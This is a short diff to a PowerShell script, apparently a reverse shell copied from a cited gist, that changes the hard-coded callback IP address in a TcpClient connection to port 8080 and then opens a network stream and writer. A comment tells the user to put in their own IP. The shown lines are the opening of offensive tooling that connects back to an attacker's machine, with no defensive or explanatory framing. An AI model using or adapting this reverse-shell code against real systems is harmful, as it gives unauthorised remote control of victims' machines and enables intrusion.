@@ -1,6 +1,6 @@
 # Original source: https://gist.github.com/staaldraad/a4e7095db8a84061c0ec
 # Change this line and put your IP
-$socket = new-object System.Net.Sockets.TcpClient('192.168.0.37', 8080);
+$socket = new-object System.Net.Sockets.TcpClient('192.168.0.53', 8080);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
